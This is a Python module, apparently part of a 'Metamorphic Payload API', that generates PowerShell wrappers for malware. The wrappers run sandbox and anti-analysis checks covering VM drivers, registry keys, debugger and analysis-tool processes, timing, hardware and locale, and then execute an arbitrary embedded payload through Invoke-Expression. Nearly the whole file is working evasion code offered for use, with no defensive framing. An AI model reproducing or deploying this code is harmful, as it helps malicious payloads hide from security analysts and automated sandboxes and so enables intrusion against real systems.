"""
Advanced Evasion Techniques Module for Metamorphic Payload API
Provides sophisticated anti-analysis and sandbox evasion capabilities.
"""

import random
import string
import base64
import time
import hashlib
from typing import List, Dict, Any, Tuple
from datetime import datetime, timedelta

from config import config
from logging_config import app_logger

class EvasionTechniques:
    """Advanced evasion and anti-analysis techniques for payload generation"""
    
    def __init__(self):
        self.evasion_methods = {
            'environment_checks': self._generate_environment_checks,
            'timing_checks': self._generate_timing_checks,
            'process_checks': self._generate_process_checks,
            'network_checks': self._generate_network_checks,
            'file_system_checks': self._generate_file_system_checks,
            'registry_checks': self._generate_registry_checks,
            'memory_checks': self._generate_memory_checks,
            'user_interaction': self._generate_user_interaction_checks,
            'geolocation_checks': self._generate_geolocation_checks,
            'hardware_checks': self._generate_hardware_checks
        }
    
    def generate_evasion_payload(self, techniques: List[str] = None, 
                               complexity_level: int = 3) -> str:
        """Generate a payload with specified evasion techniques"""
        
        if techniques is None:
            # Select random techniques based on complexity level
            available_techniques = list(self.evasion_methods.keys())
            num_techniques = min(complexity_level * 2, len(available_techniques))
            techniques = random.sample(available_techniques, num_techniques)
        
        evasion_blocks = []
        
        # Generate each requested evasion technique
        for technique in techniques:
            if technique in self.evasion_methods:
                try:
                    block = self.evasion_methods[technique]()
                    evasion_blocks.append(f"# {technique.replace('_', ' ').title()} Evasion")
                    evasion_blocks.append(block)
                    evasion_blocks.append("")  # Empty line for readability
                except Exception as e:
                    app_logger.warning(f"Failed to generate evasion technique {technique}: {e}")
        
        # Combine all evasion blocks
        full_payload = self._combine_evasion_blocks(evasion_blocks)
        
        return full_payload
    
    def _combine_evasion_blocks(self, blocks: List[str]) -> str:
        """Combine evasion blocks into a coherent payload"""
        
        # Add main execution wrapper
        wrapper_start = """
# Advanced Evasion Payload - Generated at {timestamp}
# Multiple anti-analysis techniques implemented

function Invoke-EvasiveExecution {{
    param(
        [string]$PayloadCode = "",
        [switch]$Verbose = $false
    )
    
    $EvasionPassed = $true
    $EvasionResults = @()
    
    if ($Verbose) {{ Write-Host "[+] Starting evasion checks..." -ForegroundColor Green }}
""".format(timestamp=datetime.now().isoformat())

        wrapper_end = """
    # Final evasion check
    if ($EvasionPassed) {
        if ($Verbose) { Write-Host "[+] All evasion checks passed. Executing payload..." -ForegroundColor Green }
        
        # Execute the actual payload here
        try {
            if ($PayloadCode) {
                Invoke-Expression $PayloadCode
            } else {
                # Default payload action
                Write-Host "Evasion successful - Payload would execute here" -ForegroundColor Yellow
            }
        } catch {
            if ($Verbose) { Write-Host "[-] Payload execution failed: $_" -ForegroundColor Red }
        }
    } else {
        if ($Verbose) { Write-Host "[-] Evasion checks failed. Terminating." -ForegroundColor Red }
        return $false
    }
    
    return $EvasionResults
}

# Execute the evasive function
Invoke-EvasiveExecution -Verbose
"""
        
        # Combine all parts
        full_payload = wrapper_start + "\n".join(blocks) + wrapper_end
        
        return full_payload
    
    def _generate_environment_checks(self) -> str:
        """Generate environment-based evasion checks"""
        
        checks = [
            # Check for common sandbox usernames
            '''
    # Check for sandbox usernames
    $SandboxUsers = @("sandbox", "malware", "virus", "analysis", "test", "sample", "vmware", "vbox")
    $CurrentUser = [Environment]::UserName.ToLower()
    foreach ($SandboxUser in $SandboxUsers) {
        if ($CurrentUser -like "*$SandboxUser*") {
            $EvasionPassed = $false
            $EvasionResults += "Detected sandbox username: $CurrentUser"
            if ($Verbose) { Write-Host "[-] Sandbox username detected: $CurrentUser" -ForegroundColor Red }
            break
        }
    }''',
            
            # Check for sandbox computer names
            '''
    # Check for sandbox computer names  
    $SandboxNames = @("SANDBOX", "ANALYSIS", "MALWARE", "VIRUS", "VMWARE", "VBOX", "VIRTUAL")
    $ComputerName = [Environment]::MachineName.ToUpper()
    foreach ($SandboxName in $SandboxNames) {
        if ($ComputerName -like "*$SandboxName*") {
            $EvasionPassed = $false
            $EvasionResults += "Detected sandbox computer name: $ComputerName"
            if ($Verbose) { Write-Host "[-] Sandbox computer name detected: $ComputerName" -ForegroundColor Red }
            break
        }
    }''',
            
            # Check for insufficient system resources
            '''
    # Check system resources (RAM and disk space)
    $TotalRAM = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    if ($TotalRAM -lt 2) {
        $EvasionPassed = $false
        $EvasionResults += "Insufficient RAM detected: $TotalRAM GB"
        if ($Verbose) { Write-Host "[-] Low RAM detected: $TotalRAM GB" -ForegroundColor Red }
    }
    
    $DiskSize = [math]::Round((Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB, 2)
    if ($DiskSize -lt 50) {
        $EvasionPassed = $false
        $EvasionResults += "Small disk detected: $DiskSize GB"
        if ($Verbose) { Write-Host "[-] Small disk detected: $DiskSize GB" -ForegroundColor Red }
    }'''
        ]
        
        return "\n".join(random.sample(checks, min(2, len(checks))))
    
    def _generate_timing_checks(self) -> str:
        """Generate timing-based evasion checks"""
        
        delay_time = random.randint(3, 8)
        
        return f'''
    # Timing-based evasion
    $StartTime = Get-Date
    Start-Sleep -Seconds {delay_time}
    $EndTime = Get-Date
    $ActualDelay = ($EndTime - $StartTime).TotalSeconds
    
    if ($ActualDelay -lt {delay_time - 1}) {{
        $EvasionPassed = $false
        $EvasionResults += "Time acceleration detected: Expected {delay_time}s, got $($ActualDelay)s"
        if ($Verbose) {{ Write-Host "[-] Time acceleration detected" -ForegroundColor Red }}
    }}
    
    # Check system uptime
    $Uptime = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
    if ($Uptime.TotalMinutes -lt 10) {{
        $EvasionPassed = $false
        $EvasionResults += "Recently booted system detected: $($Uptime.TotalMinutes) minutes"
        if ($Verbose) {{ Write-Host "[-] Recently booted system detected" -ForegroundColor Red }}
    }}'''
    
    def _generate_process_checks(self) -> str:
        """Generate process-based evasion checks"""
        
        return '''
    # Check for analysis tools
    $AnalysisProcesses = @("ollydbg", "immunity", "wireshark", "fiddler", "windbg", "ida", "ghidra", 
                          "x64dbg", "processhacker", "procmon", "tcpview", "regshot", "sandboxie")
    
    $RunningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
    foreach ($Process in $RunningProcesses) {
        foreach ($AnalysisProcess in $AnalysisProcesses) {
            if ($Process.ToLower() -like "*$AnalysisProcess*") {
                $EvasionPassed = $false
                $EvasionResults += "Analysis tool detected: $Process"
                if ($Verbose) { Write-Host "[-] Analysis tool detected: $Process" -ForegroundColor Red }
                break
            }
        }
        if (-not $EvasionPassed) { break }
    }
    
    # Check for insufficient running processes (sign of sandbox)
    if ($RunningProcesses.Count -lt 25) {
        $EvasionPassed = $false
        $EvasionResults += "Too few processes running: $($RunningProcesses.Count)"
        if ($Verbose) { Write-Host "[-] Suspicious process count: $($RunningProcesses.Count)" -ForegroundColor Red }
    }'''
    
    def _generate_network_checks(self) -> str:
        """Generate network-based evasion checks"""
        
        return '''
    # Network connectivity checks
    try {
        $NetworkAdapters = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.NetEnabled -eq $true }
        
        # Check for suspicious network adapter names
        $SuspiciousAdapters = @("vmware", "virtualbox", "vbox", "virtual", "vmnet", "qemu")
        foreach ($Adapter in $NetworkAdapters) {
            foreach ($Suspicious in $SuspiciousAdapters) {
                if ($Adapter.Name.ToLower() -like "*$Suspicious*") {
                    $EvasionPassed = $false
                    $EvasionResults += "Virtual network adapter detected: $($Adapter.Name)"
                    if ($Verbose) { Write-Host "[-] Virtual adapter detected: $($Adapter.Name)" -ForegroundColor Red }
                    break
                }
            }
            if (-not $EvasionPassed) { break }
        }
        
        # Check internet connectivity
        $PingResult = Test-NetConnection -ComputerName "8.8.8.8" -Port 53 -InformationLevel Quiet -WarningAction SilentlyContinue
        if (-not $PingResult) {
            $EvasionPassed = $false
            $EvasionResults += "No internet connectivity detected"
            if ($Verbose) { Write-Host "[-] No internet connectivity" -ForegroundColor Red }
        }
    } catch {
        # Network checks failed, might be restricted environment
        $EvasionResults += "Network checks failed: $_"
        if ($Verbose) { Write-Host "[-] Network checks failed" -ForegroundColor Yellow }
    }'''
    
    def _generate_file_system_checks(self) -> str:
        """Generate file system-based evasion checks"""
        
        return '''
    # File system checks
    $SandboxFiles = @(
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",  
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
        "C:\\windows\\system32\\vboxdisp.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\Program Files\\VMware\\VMware Tools\\",
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\",
        "C:\\windows\\system32\\drivers\\vmci.sys"
    )
    
    foreach ($File in $SandboxFiles) {
        if (Test-Path $File) {
            $EvasionPassed = $false
            $EvasionResults += "Virtualization file detected: $File"
            if ($Verbose) { Write-Host "[-] Virtualization file detected: $File" -ForegroundColor Red }
            break
        }
    }
    
    # Check for analysis tools installation
    $AnalysisDirectories = @(
        "C:\\Program Files\\Wireshark\\",
        "C:\\Program Files\\IDA Pro\\",
        "C:\\Program Files\\OllyDbg\\",
        "C:\\Program Files\\Immunity Inc\\",
        "C:\\Program Files\\Sandboxie\\"
    )
    
    foreach ($Dir in $AnalysisDirectories) {
        if (Test-Path $Dir) {
            $EvasionPassed = $false
            $EvasionResults += "Analysis tool directory detected: $Dir"
            if ($Verbose) { Write-Host "[-] Analysis tool directory detected: $Dir" -ForegroundColor Red }
            break
        }
    }'''
    
    def _generate_registry_checks(self) -> str:
        """Generate registry-based evasion checks"""
        
        return '''
    # Registry-based detection evasion
    try {
        # Check for VMware registry entries
        $VMwareKeys = @(
            "HKLM:\\SOFTWARE\\VMware, Inc.\\VMware Tools",
            "HKLM:\\SYSTEM\\ControlSet001\\Services\\vmtools",
            "HKLM:\\SYSTEM\\ControlSet001\\Services\\VMMEMCTL"
        )
        
        foreach ($Key in $VMwareKeys) {
            if (Test-Path $Key) {
                $EvasionPassed = $false
                $EvasionResults += "VMware registry key detected: $Key"
                if ($Verbose) { Write-Host "[-] VMware registry key detected" -ForegroundColor Red }
                break
            }
        }
        
        # Check for VirtualBox registry entries
        $VBoxKeys = @(
            "HKLM:\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
            "HKLM:\\SYSTEM\\ControlSet001\\Services\\VBoxGuest"
        )
        
        foreach ($Key in $VBoxKeys) {
            if (Test-Path $Key) {
                $EvasionPassed = $false
                $EvasionResults += "VirtualBox registry key detected: $Key"
                if ($Verbose) { Write-Host "[-] VirtualBox registry key detected" -ForegroundColor Red }
                break
            }
        }
        
        # Check system information
        $SystemInfo = Get-ItemProperty "HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS" -ErrorAction SilentlyContinue
        if ($SystemInfo.SystemManufacturer -like "*VMware*" -or $SystemInfo.SystemManufacturer -like "*VirtualBox*") {
            $EvasionPassed = $false
            $EvasionResults += "Virtual system manufacturer detected: $($SystemInfo.SystemManufacturer)"
            if ($Verbose) { Write-Host "[-] Virtual manufacturer detected" -ForegroundColor Red }
        }
    } catch {
        $EvasionResults += "Registry checks failed: $_"
        if ($Verbose) { Write-Host "[-] Registry checks failed" -ForegroundColor Yellow }
    }'''
    
    def _generate_memory_checks(self) -> str:
        """Generate memory-based evasion checks"""
        
        return '''
    # Memory and performance checks
    try {
        # Check available memory
        $AvailableMemory = Get-WmiObject -Class Win32_OperatingSystem | Select-Object @{Name="FreeMemoryGB";Expression={[math]::Round($_.FreePhysicalMemory/1MB, 2)}}
        if ($AvailableMemory.FreeMemoryGB -lt 0.5) {
            $EvasionPassed = $false
            $EvasionResults += "Low available memory: $($AvailableMemory.FreeMemoryGB) GB"
            if ($Verbose) { Write-Host "[-] Low available memory detected" -ForegroundColor Red }
        }
        
        # Check CPU cores
        $CPUCores = (Get-WmiObject -Class Win32_Processor).NumberOfCores
        if ($CPUCores -lt 2) {
            $EvasionPassed = $false
            $EvasionResults += "Low CPU core count: $CPUCores"
            if ($Verbose) { Write-Host "[-] Low CPU core count: $CPUCores" -ForegroundColor Red }
        }
        
        # Simple CPU performance test
        $StartTime = Get-Date
        $TestValue = 0
        for ($i = 0; $i -lt 1000000; $i++) {
            $TestValue += $i
        }
        $EndTime = Get-Date
        $CPUTime = ($EndTime - $StartTime).TotalMilliseconds
        
        if ($CPUTime -lt 10) {
            $EvasionPassed = $false
            $EvasionResults += "CPU performance too fast: $CPUTime ms"
            if ($Verbose) { Write-Host "[-] Suspicious CPU performance" -ForegroundColor Red }
        }
    } catch {
        $EvasionResults += "Memory checks failed: $_"
        if ($Verbose) { Write-Host "[-] Memory checks failed" -ForegroundColor Yellow }
    }'''
    
    def _generate_user_interaction_checks(self) -> str:
        """Generate user interaction-based evasion checks"""
        
        return '''
    # User interaction checks
    try {
        # Check for recent user activity
        $LastInput = Get-WmiObject -Class Win32_Process | Where-Object { $_.Name -eq "explorer.exe" }
        if (-not $LastInput) {
            $EvasionPassed = $false
            $EvasionResults += "No explorer.exe process found"
            if ($Verbose) { Write-Host "[-] No user session detected" -ForegroundColor Red }
        }
        
        # Check for mouse movement (indirect method)
        $CursorPos1 = [System.Windows.Forms.Cursor]::Position
        Start-Sleep -Milliseconds 1000
        $CursorPos2 = [System.Windows.Forms.Cursor]::Position
        
        if ($CursorPos1.X -eq $CursorPos2.X -and $CursorPos1.Y -eq $CursorPos2.Y) {
            # No movement detected, could be automated
            $EvasionResults += "No mouse movement detected during check"
            if ($Verbose) { Write-Host "[*] Static mouse position detected" -ForegroundColor Yellow }
        }
        
        # Check for installed user applications
        $UserApps = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | 
                   Where-Object { $_.DisplayName -like "*Office*" -or $_.DisplayName -like "*Chrome*" -or $_.DisplayName -like "*Firefox*" }
        
        if ($UserApps.Count -eq 0) {
            $EvasionPassed = $false
            $EvasionResults += "No common user applications found"
            if ($Verbose) { Write-Host "[-] No user applications detected" -ForegroundColor Red }
        }
    } catch {
        $EvasionResults += "User interaction checks failed: $_"
        if ($Verbose) { Write-Host "[-] User interaction checks failed" -ForegroundColor Yellow }
    }'''
    
    def _generate_geolocation_checks(self) -> str:
        """Generate geolocation-based evasion checks"""
        
        return '''
    # Geolocation and timezone checks
    try {
        # Check timezone
        $TimeZone = Get-TimeZone
        $SuspiciousTimezones = @("UTC", "GMT")
        
        if ($TimeZone.Id -in $SuspiciousTimezones) {
            $EvasionPassed = $false
            $EvasionResults += "Suspicious timezone detected: $($TimeZone.Id)"
            if ($Verbose) { Write-Host "[-] Suspicious timezone: $($TimeZone.Id)" -ForegroundColor Red }
        }
        
        # Check system locale
        $SystemLocale = Get-WinSystemLocale
        if ($SystemLocale.Name -eq "en-US" -and $TimeZone.Id -like "*UTC*") {
            $EvasionPassed = $false
            $EvasionResults += "Default sandbox locale/timezone combination"
            if ($Verbose) { Write-Host "[-] Default sandbox configuration detected" -ForegroundColor Red }
        }
        
        # Check for keyboard layouts
        $KeyboardLayouts = Get-WinUserLanguageList
        if ($KeyboardLayouts.Count -eq 1 -and $KeyboardLayouts[0].LanguageTag -eq "en-US") {
            $EvasionResults += "Only default keyboard layout detected"
            if ($Verbose) { Write-Host "[*] Only default keyboard layout" -ForegroundColor Yellow }
        }
    } catch {
        $EvasionResults += "Geolocation checks failed: $_"
        if ($Verbose) { Write-Host "[-] Geolocation checks failed" -ForegroundColor Yellow }
    }'''
    
    def _generate_hardware_checks(self) -> str:
        """Generate hardware-based evasion checks"""
        
        return '''
    # Hardware-based checks
    try {
        # Check for virtual hardware
        $VideoController = Get-WmiObject -Class Win32_VideoController
        foreach ($Controller in $VideoController) {
            $VirtualGPUs = @("VMware", "VirtualBox", "QEMU", "Virtual", "Standard VGA")
            foreach ($VirtualGPU in $VirtualGPUs) {
                if ($Controller.Name -like "*$VirtualGPU*") {
                    $EvasionPassed = $false
                    $EvasionResults += "Virtual GPU detected: $($Controller.Name)"
                    if ($Verbose) { Write-Host "[-] Virtual GPU detected: $($Controller.Name)" -ForegroundColor Red }
                    break
                }
            }
            if (-not $EvasionPassed) { break }
        }
        
        # Check disk drive models
        $DiskDrives = Get-WmiObject -Class Win32_DiskDrive
        foreach ($Drive in $DiskDrives) {
            $VirtualDisks = @("VMWARE", "VBOX", "QEMU", "Virtual")
            foreach ($VirtualDisk in $VirtualDisks) {
                if ($Drive.Model -like "*$VirtualDisk*") {
                    $EvasionPassed = $false
                    $EvasionResults += "Virtual disk detected: $($Drive.Model)"
                    if ($Verbose) { Write-Host "[-] Virtual disk detected: $($Drive.Model)" -ForegroundColor Red }
                    break
                }
            }
            if (-not $EvasionPassed) { break }
        }
        
        # Check for USB devices (real systems usually have some)
        $USBDevices = Get-WmiObject -Class Win32_USBControllerDevice
        if ($USBDevices.Count -lt 3) {
            $EvasionResults += "Low USB device count: $($USBDevices.Count)"
            if ($Verbose) { Write-Host "[*] Low USB device count detected" -ForegroundColor Yellow }
        }
        
        # Check motherboard information
        $Motherboard = Get-WmiObject -Class Win32_BaseBoard
        $VirtualBoards = @("VMware", "VirtualBox", "QEMU", "Virtual", "Bochs")
        foreach ($VirtualBoard in $VirtualBoards) {
            if ($Motherboard.Manufacturer -like "*$VirtualBoard*" -or $Motherboard.Product -like "*$VirtualBoard*") {
                $EvasionPassed = $false
                $EvasionResults += "Virtual motherboard detected: $($Motherboard.Manufacturer) $($Motherboard.Product)"
                if ($Verbose) { Write-Host "[-] Virtual motherboard detected" -ForegroundColor Red }
                break
            }
        }
    } catch {
        $EvasionResults += "Hardware checks failed: $_"
        if ($Verbose) { Write-Host "[-] Hardware checks failed" -ForegroundColor Yellow }
    }'''

# Global evasion techniques instance
evasion_engine = EvasionTechniques()

def apply_evasion_techniques(base_payload: str, techniques: List[str] = None,
                           complexity_level: int = 3) -> str:
    """Apply evasion techniques to an existing payload"""
    
    try:
        evasion_code = evasion_engine.generate_evasion_payload(techniques, complexity_level)
        
        # Insert the base payload into the evasion wrapper
        enhanced_payload = evasion_code.replace(
            'Write-Host "Evasion successful - Payload would execute here" -ForegroundColor Yellow',
            base_payload
        )
        
        return enhanced_payload
        
    except Exception as e:
        app_logger.error(f"Failed to apply evasion techniques: {e}")
        return base_payload  # Return original payload if evasion fails

def get_available_evasion_techniques() -> List[str]:
    """Get list of available evasion techniques"""
    return list(evasion_engine.evasion_methods.keys())
